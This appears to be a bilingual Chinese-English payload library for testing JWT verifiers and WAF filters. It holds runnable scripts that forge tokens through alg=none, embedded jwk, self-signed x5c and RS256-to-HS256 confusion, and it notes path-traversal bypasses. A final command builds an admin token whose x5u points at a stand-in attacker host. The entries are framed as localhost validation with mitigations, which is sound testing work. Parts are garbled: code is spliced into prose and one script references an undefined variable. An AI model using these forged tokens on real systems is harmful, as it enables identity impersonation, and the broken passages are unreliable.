opsecTips.en: Do not retrieve application logs through the interface because they may contain other users' data.

description.zh: 绕过对 file:/// 明文前缀的匹配：分隔符编码后由应用解码；文件内容返回即成功。
description.en: Encode separators so the plaintext prefix disappears until application decoding; returned file content confirms success.

description.zh: 绕过对 URI 协议头的统一过滤：不携带协议直接穿越路径；目标文件内容回显即成功。
description.en: Traverse without any scheme header to bypass protocol-based filtering entirely; echoed target file content confirms success.

description.zh: 绕过对完整长文件名的特征匹配：使用 8.3 短名等价路径；读取内容一致即成功。
description.en: Use equivalent 8.3 short paths against full-name signature matching; identical content being read confirms success.

name.zh: JWT Claim Profile 验证

description.zh: 分别验证 issuer、audience、expiration 与显式 token type，只有完全匹配的短期测试 token 可以访问只读标记。
description.en: Validates issuer, audience, expiration, and explicit token type independently so only a fully matching short-lived test token reaches the read-only marker.

overview.zh: 该 Payload 覆盖 JWT 声明校验完整性场景，检验验证器是否严格执行 issuer、audience、expiration 与显式 token type 的全部匹配。验证维度为本地构造的多组 claim 对照 token 单步执行，对应第 1 步。
overview.en: This payload covers JWT claim validation completeness, testing whether the verifier strictly enforces issuer, audience, expiration and explicit token-type matching. Validation runs multiple locally crafted claim-control tokens in a single step, mapped to step 1.

vulnerability.zh: 根因在于验证器只校验签名而放松声明约束：签发者、受众、有效期或令牌类型任一字段未被严格比对，攻击者即可复用或改签其他用途的合法签名令牌跨服务冒用身份。
vulnerability.en: The root cause is a verifier that checks only the signature while relaxing claim constraints: if issuer, audience, expiration or token type is not strictly compared, attackers can reuse or re-sign tokens issued for other purposes to impersonate identities across services.

exploitation.zh: 第 1 步执行脚本在本地生成仅 claim 不同的对照 token 序列并逐个请求 localhost 只读标记端点，记录服务端返回的算法、key 与 claim 决策；任一字段不符仍放行即确认校验缺失，全部拒绝则证明声明校验完整。成功判据以服务端决策记录为准。占位符在全局变量菜单替换为目标值；结果与只读标记一并留档进报告。
exploitation.en: In step 1, run the script to generate locally a sequence of tokens differing only in claims and request the localhost read-only marker endpoint one by one, recording the server's algorithm, key and claim decisions; acceptance despite a mismatched field confirms missing validation, while uniform rejection proves complete claim checking. Judge success by server decision logs. Replace placeholders via the global variables menu; file the results with the read-only marker in your report.

mitigation.zh: 验证器强制校验 iss、aud、exp 与类型声明，任何字段不匹配一律拒绝并采用短有效期。修复后重放第 1 步对照序列，所有不符令牌应被 401 拒绝。
mitigation.en: Enforce strict iss, aud, exp and type-claim validation, rejecting any mismatch with short lifetimes. After the fix, replay the step 1 control sequence: every mismatched token should be rejected with 401.

title.zh: 建立JWT Claim Profile 验证基线

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT Claim Profile 验证阴性对照
title.en: Submit the JWT Claim Profile Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

attackChain.payload:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
now = int(time.time())
cases = {
    "valid": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-issuer": {"sub":"payloader-user","iss":"payloader-other","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-audience": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-other","iat":now,"exp":now+60},
    "expired": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now-120,"exp":now-60},
}
for name, claims in cases.items():
    header = encode({"alg":"HS256","typ":"payloader+jwt","kid":"PAYLOADER_TEST_KEY"})
    payload = encode(claims)
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(name, status)
PY
# Only the valid profile reaches the read-only marker; issuer, audience, and expiration failures are independent.

description.zh: 关联算法选择、key resolver、claim 校验、HTTP 状态和最终主体，排除仅能生成或解码 token 的假阳性。
description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

description.zh: 删除本地 token、key、证书和缓存，重放有效基线与全部固定阴性对照。
description.en: Delete local tokens, keys, certificates, and caches, then replay the valid baseline and every fixed negative control.

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: 仅使用本地生成令牌、固定测试 HMAC key 或临时 RSA/X.509 fixture；不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

analysis.zh: 本条聚焦JWT 验证边界混合集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This entry focuses on Mixed JWT Validation Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

description.zh: 绕过头部单键解析的 WAF 规则：重复 alg 键在验证层与日志层取值不同。成功判据：none 实例被验证接受。
description.en: Bypasses single-key header parsing: duplicate alg keys resolve differently in validation vs logging. Success: the none instance is accepted by validation.

description.zh: 签发者字段用数组形态绕过字符串精确比对。成功判据：任一签发者被采信。
description.en: Array-shaped issuer bypasses exact string comparison. Success: either issuer is honored.

description.zh: 字符串与数组形态交替命中弱受众校验。成功判据：admin-api 受众下令牌仍有效。
description.en: String and array alternation hits weak audience validation. Success: the token still works for the admin-api audience.

name.zh: JWT 内嵌 JWK 信任验证

description.zh: 验证服务端不会直接信任 token 自带的 jwk，而只使用 issuer 配置中固定的 key 来源。
description.en: Verifies that the server does not trust a token-supplied jwk and uses only key sources pinned in issuer configuration.

overview.zh: 该 Payload 覆盖 JWT 内嵌 jwk 信任边界场景，检验验证器是否忽略令牌自带的 JWK 而仅使用签发方配置中的固定密钥来源。验证维度为自签伪造密钥的内嵌 JWK 对照 token 单步执行，对应第 1 步。
overview.en: This payload covers the embedded-jwk trust boundary of JWTs, testing whether the verifier ignores the token-supplied JWK and uses only the fixed key source from issuer configuration. Validation runs one control token signed with a self-made embedded JWK, mapped to step 1.

vulnerability.zh: 根因在于验证器把令牌头中的 jwk 当作可信密钥来源：攻击者自造密钥签名并内嵌对应 JWK，服务端用它完成验证，等于把信任锚交给攻击者，签名机制被完全架空。
vulnerability.en: The root cause is treating the jwk header as a trusted key source: attackers sign with their own key and embed the matching JWK, and the server uses it for verification, handing the trust anchor to the attacker and nullifying the signature mechanism.

exploitation.zh: 第 1 步执行脚本生成自造 RSA 密钥对并签发内嵌 jwk 的 token，请求 localhost 只读标记端点并记录服务端决策；令牌被接受即确认内嵌 JWK 信任漏洞，被拒绝则说明密钥来源固定。成功判据为服务端返回的 key 来源记录。占位符在全局变量菜单替换；结果与只读标记一并留档用于报告。
exploitation.en: In step 1, run the script to generate a self-made RSA keypair and issue a token embedding its jwk, then request the localhost read-only marker endpoint and record the server decision; acceptance confirms the embedded-JWK trust flaw, rejection shows a fixed key source. The success criterion is the server's key-source record. Replace placeholders via the global variables menu; file results with the read-only marker for the report.

mitigation.zh: 密钥来源固定为 issuer 配置的 JWKS 地址或本地密钥库，忽略令牌头中 jwk、jku、x5u 等自带密钥字段。修复后重放第 1 步，自签令牌应被拒绝。
mitigation.en: Fix the key source to the issuer-configured JWKS URL or a local keystore and ignore token-supplied key fields such as jwk, jku and x5u. After the fix, replay step 1: the self-signed token should be rejected.

title.zh: 建立JWT 内嵌 JWK 信任验证基线
title.en: Baseline JWT Embedded JWK Trust Validation

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT 内嵌 JWK 信任验证阴性对照
title.en: Submit the JWT Embedded JWK Trust Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

description.zh: 头部 kid 指向可信键而内嵌 jwk 为攻击者键，检验取键优先级。成功判据：按内嵌 jwk 验证通过。
description.en: Header kid points at a trusted key while the embedded jwk is the attacker's, probing key-selection priority. Success: verification succeeds against the embedded jwk.

description.zh: HS256 配 RSA 形态 jwk，绕过算法-密钥类型绑定检查。成功判据：非对称材料被用于对称验签。
description.en: HS256 paired with an RSA-shaped jwk bypasses algorithm-key type binding. Success: asymmetric material is used for symmetric verification.

description.zh: Unicode 转义 kid 绕过头值特征匹配。成功判据：变形 kid 完成键匹配。
description.en: Unicode-escaped kid bypasses header-value signature matching. Success: the mutated kid completes key matching.

name.zh: JWT X5C 证书链信任验证
name.en: JWT X5C Certificate Chain Trust Validation

description.zh: 使用本地自签测试证书构造签名正确的阴性 token，确认验证器仍执行完整证书链和 issuer 信任校验。
description.en: Uses a locally self-signed test certificate to create a correctly signed negative token and confirms that the verifier still validates the certificate chain and issuer trust.

overview.zh: 该 Payload 覆盖 JWT x5c 证书链信任边界场景，检验验证器是否对令牌头携带的证书执行完整链校验与签发方信任判定。验证维度为本地自签测试证书构造的签名正确阴性 token 单步执行，对应第 1 步。
overview.en: This payload covers the x5c certificate-chain trust boundary of JWTs, testing whether the verifier performs full chain validation and issuer trust checks on header-carried certificates. Validation runs one correctly signed negative token built with a local self-signed test certificate, mapped to step 1.

vulnerability.zh: 根因在于验证器仅执行 x5c 证书的签名运算而不校验证书链与签发方：自签或无关 CA 签发的证书被当作可信密钥，攻击者即可用任意证书完成合法签名运算通过验证。
vulnerability.en: The root cause is performing only the signature operation on the x5c certificate without chain and issuer validation: self-signed or unrelated-CA certificates are treated as trusted keys, letting attackers pass verification with any certificate that produces a valid signature.

exploitation.zh: 第 1 步运行脚本用 openssl 生成一日自签证书并签发携带 x5c 的 token，请求只读标记端点并记录决策；签名正确却被拒绝才说明链校验生效，被接受即确认 x5c 信任漏洞。成功判据为服务端对证书链的判定记录。占位符在全局变量菜单替换；脚本退出时临时目录自动清理。
exploitation.en: In step 1, run the script to generate a one-day self-signed certificate with openssl and issue an x5c-carrying token, then request the read-only marker endpoint and record the decision; rejection despite a valid signature shows chain validation works, acceptance confirms the x5c trust flaw. The success criterion is the server's chain decision record. Replace placeholders via the global variables menu; the temp directory is cleaned up when the script exits.

mitigation.zh: x5c 证书必须链到本地信任的 CA 并匹配预配置 issuer，禁止直接采信令牌自带证书，同时固定算法。修复后重放第 1 步，自签证书令牌应被拒绝。
mitigation.en: Require x5c certificates to chain to a locally trusted CA and match the preconfigured issuer, never trust token-supplied certificates directly, and pin the algorithm. After the fix, replay step 1: the self-signed-certificate token should be rejected.

title.zh: 建立JWT X5C 证书链信任验证基线
title.en: Baseline JWT X5C Certificate Chain Trust Validation

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。

title.en: Submit the JWT X5C Certificate Chain Trust Validation Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

attackChain.payload:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl req -x509 -nodes -newkey rsa:2048 -keyout "$work_dir/key.pem" -out "$work_dir/cert.pem" -days 1 -subj "/CN=payloader-untrusted"
python3 - "$work_dir/key.pem" "$work_dir/cert.pem" <<'PY'
import base64, json, subprocess, sys, time, urllib.error, urllib.request
encode = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
certificate = subprocess.check_output(["openssl","x509","-in",sys.argv[2],"-outform","DER"])
header = encode(json.dumps({"alg":"RS256","typ":"payloader+jwt","x5c":[base64.b64encode(certificate).decode()]}, separators=(",",":")).encode())
payload = encode(json.dumps({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60}, separators=(",",":")).encode())
signing_input = (header+"."+payload).encode()
signature = subprocess.check_output(["openssl","dgst","-sha256","-sign",sys.argv[1]], input=signing_input)
token = header+"."+payload+"."+encode(signature)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: a correctly signed token with an untrusted self-signed x5c chain is rejected.

prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

analysis.zh: 本条聚焦JWT 验证边界混合集。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This entry focuses on Mixed JWT Validation Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

description.zh: 叶子证书替换为攻击者自签，检验链构建是否锚定可信根。成功判据：自签叶子被接受。
description.en: Swapping the leaf for an attacker self-signed cert tests whether chain building anchors to the trusted root. Success: the self-signed leaf is accepted.

title.zh: 空 x5c 加 x5u 引导

description.zh: x5c 留空而 x5u 引导远程拉链，绕过本地链校验。成功判据：远程链被拉取并采信。
description.en: Empty x5c with x5u bootstrapping a remote chain bypasses local chain validation. Success: the remote chain is fetched and trusted.

description.zh: 重复 x5c 键在不同解析层取不同数组。成功判据：验证层取到攻击者证书。
description.en: Duplicate x5c keys resolve to different arrays in different layers. Success: the validation layer reads the attacker certificate.

name.zh: JWT None 与未签名令牌拒绝
name.en: JWT None and Unsigned Token Rejection

description.zh: 用固定数量的 none 大小写、缺失算法以及空、任意或缺失签名对照，确认验证器在使用 claim 前拒绝未签名 JWS。
description.en: Uses a fixed set of none case variants, missing algorithms, and empty, arbitrary, or missing signatures to confirm rejection before claims are used.

overview.zh: 该 Payload 覆盖 JWT 未签名令牌拒绝场景，检验验证器是否严格拒绝 alg=none 及其大小写变体、缺失算法与空签名结构。验证维度为 none 变体、缺算法与任意或空签名五组对照，对应第 1 至第 5 步。
overview.en: This payload covers unsigned-token rejection in JWTs, testing whether the verifier strictly rejects alg=none and case variants, missing algorithms, and empty signature structures. Validation covers five control groups across none variants, missing alg, and arbitrary or empty signatures, mapped to steps 1 through 5.

vulnerability.zh: 根因在于验证器允许算法协商且未在验签前锁定 alg：none 或空签名令牌被解析进授权逻辑，攻击者无需密钥即可伪造任意身份与权限声明。
vulnerability.en: The root cause is algorithm negotiation without pinning alg before verification: none or empty-signature tokens are parsed into authorization logic, letting attackers forge any identity or privilege claims without a key.

exploitation.zh: 第 1、2 步执行脚本生成 none 大小写与缺失算法变体令牌并逐个提交，任一被接受即确认算法固定缺失；第 3、4 步以空签名与任意签名值对照，观察验签是否被跳过；第 5 步提交畸形签名结构确认失败关闭行为。以服务端 401 决策为成功判据，接受任何未签名令牌即漏洞成立。占位符在全局变量菜单替换；全程仅访问只读标记端点。
exploitation.en: In steps 1 and 2, run the script to generate none case and missing-alg variant tokens and submit each; any acceptance confirms missing algorithm pinning. In steps 3 and 4, compare empty and arbitrary signature values to see whether verification is skipped. In step 5, submit malformed signature structures to confirm fail-closed behavior. Use the server's 401 decisions as success criteria; accepting any unsigned token proves the flaw. Replace placeholders via the global variables menu; only the read-only marker endpoint is accessed throughout.

mitigation.zh: 验证器在解析后立即断言 alg 属于预配置白名单，none 一律拒绝，验签失败时中止授权流程。修复后重放第 1 至第 5 步，全部变体应返回拒绝。
mitigation.en: Assert immediately after parsing that alg is in a preconfigured allowlist, always reject none, and abort authorization when verification fails. After the fix, replay steps 1 through 5: every variant should be rejected.

title.zh: 建立JWT None 与未签名令牌拒绝基线
title.en: Baseline JWT None and Unsigned Token Rejection

description.zh: 用测试 issuer 签发短期有效 token，记录算法、key ID、issuer、audience、type、主体和标记访问。
description.en: Issue a short-lived valid token from the test issuer and record algorithm, key ID, issuer, audience, type, principal, and marker access.

title.zh: 提交JWT None 与未签名令牌拒绝阴性对照
title.en: Submit the JWT None and Unsigned Token Rejection Negative Control

description.zh: 只提交当前验证卡的第一条对照，并保持 issuer、主体和只读目标不变。
description.en: Submit only the first control in this validation card while keeping issuer, principal, and read-only target unchanged.

name.zh: JWT 算法与 Key 类型绑定

description.zh: 使用临时本地 RSA public key 构造历史 RS256 到 HS256 混淆对照，确认验证器固定算法且不把 public key 当 HMAC secret。
description.en: Builds a historical RS256-to-HS256 confusion control from a temporary local RSA public key and confirms that the verifier pins algorithms and never treats the public key as an HMAC secret.

overview.zh: 该 Payload 覆盖 JWT 算法与密钥类型绑定场景，检验 RS256 服务是否会把 HS256 混淆令牌连同公钥一起接受为 HMAC 密钥。验证维度为本地 RSA 密钥构造的混淆对照与令牌提交两步，对应第 1 至第 2 步。
overview.en: This payload covers JWT algorithm and key-type binding, testing whether an RS256 service accepts an HS256 confusion token using the public key as an HMAC secret. Validation covers a locally built RSA confusion control and token submission, mapped to steps 1 and 2.

vulnerability.zh: 根因在于验证器按令牌头选择算法且未绑定密钥类型：公钥被当作 HMAC 共享密钥使用，而公钥人人可得，攻击者据此自行签发任意合法 HS256 令牌。
vulnerability.en: The root cause is selecting the algorithm from the token header without binding key types: the public key is treated as an HMAC shared secret, and since public keys are public, attackers can self-issue arbitrary valid HS256 tokens.

exploitation.zh: 第 1 步运行脚本生成临时 RSA 密钥对，以公钥为 HMAC secret 签发 alg 为 HS256 的混淆令牌并提交本地端点；第 2 步用 curl 携带对照令牌请求标记路径并观察状态码。混淆令牌被接受即确认算法混淆漏洞，401 拒绝则说明绑定生效。成功判据以响应码与 key 决策记录为准。占位符在全局变量菜单替换；HMAC 密钥仅使用自有 fixture 而非 TLS 证书。
exploitation.en: In step 1, run the script to generate a temporary RSA keypair, sign an HS256 confusion token using the public key as the HMAC secret, and submit it to the local endpoint. In step 2, use curl with the control token against the marker path and read the status code. Acceptance confirms algorithm confusion; a 401 rejection shows binding works. Judge success by the status code and key-decision records. Replace placeholders via the global variables menu; use only your own fixture key for HMAC, not the TLS certificate.

mitigation.zh: 按签发配置固定算法与密钥类型，RS256 场景显式禁用 HMAC 家族并拒绝类型不符的密钥。修复后重放第 1、2 步，混淆令牌应被 401 拒绝。
mitigation.en: Pin algorithm and key type to the issuance configuration, explicitly disable the HMAC family for RS256 deployments, and reject type-mismatched keys. After the fix, replay steps 1 and 2: the confusion token should be rejected with 401.

attackChain.payload:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$work_dir/test-private.pem"
openssl pkey -in "$work_dir/test-private.pem" -pubout -out "$work_dir/test-public.pem"
python3 - "$work_dir/test-public.pem" <<'PY'
import base64, hashlib, hmac, json, sys, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
public_key = open(sys.argv[1], "rb").read()
header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": "PAYLOADER_RSA_TEST_KEY"})
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
signature = base64.urlsafe_b64encode(hmac.new(public_key, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
print(header + "." + claims + "." + signature)
PY
# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it.

name.zh: JWT KID 允许列表与查找边界
name.en: JWT KID Allowlist and Lookup Boundary

description.zh: 用已知、未知、禁用和超长的合成 kid 检查 key resolver，仅允许配置中的不透明标识进入签名验证。
description.en: Checks the key resolver with known, unknown, disabled, and overlong synthetic kid values so only configured opaque identifiers reach signature verification.

overview.zh: 该 Payload 覆盖 JWT kid 密钥解析边界场景，检验 key resolver 是否只允许配置允许列表内的不透明标识进入签名验证。验证维度为已知、未知、禁用与超长合成 kid 的对照单步执行，对应第 1 步。
overview.en: This payload covers the JWT kid key-resolution boundary, testing whether the key resolver admits only opaque identifiers from the configured allowlist into signature verification. Validation runs known, unknown, disabled and oversized synthetic kids as one control set, mapped to step 1.

vulnerability.zh: 根因在于 kid 被直接拼进路径、数据库查询或远程查找而缺少允许列表：攻击者构造恶意 kid 即可指向受控文件、注入查询或触发目录遍历，从而操纵验证密钥。
vulnerability.en: The root cause is kid concatenated directly into paths, database queries or remote lookups without an allowlist: crafted kids can point to attacker-controlled files, inject queries or trigger traversal, manipulating the verification key.

exploitation.zh: 第 1 步执行脚本生成携带不同 kid 的 HMAC 令牌序列并逐个提交 localhost 端点，记录服务端对每个 kid 的解析决策；配置外 kid 触发查找或路径解析即确认边界缺失，仅允许列表内标识进入验签则通过。成功判据以 resolver 决策记录为准。占位符在全局变量菜单替换；结果随只读标记一并留档。
exploitation.en: In step 1, run the script to generate an HMAC token sequence with different kids and submit each to the localhost endpoint, recording the resolver decision per kid; out-of-config kids triggering lookups or path resolution confirms the missing boundary, while only allowlisted identifiers reaching verification passes. import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
kids = ("PAYLOADER_TEST_KEY", "PAYLOADER_UNKNOWN_KEY", "PAYLOADER_DISABLED_KEY", "PAYLOADER_KEY_" + "X" * 80)
for kid in kids:
    header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": kid})
    claims = encode({"sub": "payloader-user", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()

    print(kid[:32], status)

analysis.en: This entry focuses on JWT JKU and X5U Key Source Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

wafBypass.command:
python3 - <<'PY'
import base64, json
hdr = {"alg":"RS256","typ":"JWT","x5u":"http://{ATTACKER_HOST}/cert.pem"}
h = base64.urlsafe_b64encode(json.dumps(hdr, separators=(',',':')).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().rstrip('=')
print(f"{h}.{p}.ATTACKER_SIGNATURE")
PY

description.zh: http 明文 x5u 绕过 https 强制校验。成功判据：证书经明文通道被拉取采信。
description.en: Plaintext http x5u bypasses https enforcement. Success: the certificate is fetched and trusted over cleartext.
